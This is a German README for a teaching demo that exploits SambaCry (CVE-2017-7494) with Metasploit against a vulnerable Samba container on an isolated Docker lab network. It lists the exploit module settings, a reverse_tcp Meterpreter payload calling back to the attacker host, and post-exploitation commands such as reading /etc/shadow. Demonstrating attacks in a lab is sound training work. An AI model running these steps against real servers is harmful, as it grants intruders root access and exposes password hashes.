# Metasploit SMB-Demo

Live-Demo eines klassischen SMB-Exploits in einer isolierten Docker-Umgebung.

**Szenario:** Ein Angreifer entdeckt einen verwundbaren Samba-Server im Netz, exploited **SambaCry (CVE-2017-7494)** und bekommt eine Root-Meterpreter-Shell.

SambaCry wurde 2017 als "EternalRed" bezeichnet — die Linux-Variante von EternalBlue / WannaCry. Gleicher Kontext, gleiche Klasse: SMB-Schwachstelle, Remote Code Execution. Wir nehmen die Linux-Variante, weil sie sauber in Docker auf Apple Silicon läuft.

## Setup

```
┌──────────────┐         ┌──────────────┐
│   attacker   │ ──────▶ │    victim    │
│ 10.10.0.10   │   SMB   │ 10.10.0.20   │
│ Metasploit   │         │ Samba 4.3.8  │
└──────────────┘         └──────────────┘
        Docker-Netz: lab (10.10.0.0/24)
```

## Start

```sh
docker compose up -d
docker attach msf-attacker
```

`docker attach` hängt sich an die laufende `msfconsole`. Mit `Ctrl-P Ctrl-Q` wieder ablösen, ohne sie zu killen.

## Demo-Ablauf

### 1. Recon — was läuft im Netz?

In der `msfconsole`:

```
db_nmap -sV 10.10.0.20
```

→ Port 139/445 offen, Service `Samba smbd`.

### 2. Schwachstelle prüfen

```
use exploit/linux/samba/is_known_pipename
set RHOSTS 10.10.0.20
check
```

→ `The target appears to be vulnerable.`

### 3. Exploit

```
set target 3
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.0.10
set SMB_SHARE_NAME share
set SMB_FOLDER /tmp
run
```

→ Meterpreter-Session als **root**.

### 4. Post-Exploitation

In der Meterpreter-Session:

```
getuid          # uid=0 root
sysinfo         # OS, hostname, architecture
shell           # echte Shell auf dem Opfer
```

In der Shell:

```sh
cat /etc/shadow
ls /root
```

Mit `exit` zurück in die Meterpreter, mit `background` zurück in `msfconsole`.

## Stop

```sh
docker compose down
```

## Hinweise

- Das Victim-Image ist `linux/amd64` und läuft auf Apple Silicon via Rosetta.
- Beide Container hängen nur am internen `lab`-Netz — keine Ports auf den Host gemappt.
- Die `STATUS_OBJECT_NAME_NOT_FOUND`-Meldungen im Exploit-Output sind normal: das Modul probiert mehrere Pipename-Varianten, eine davon greift.
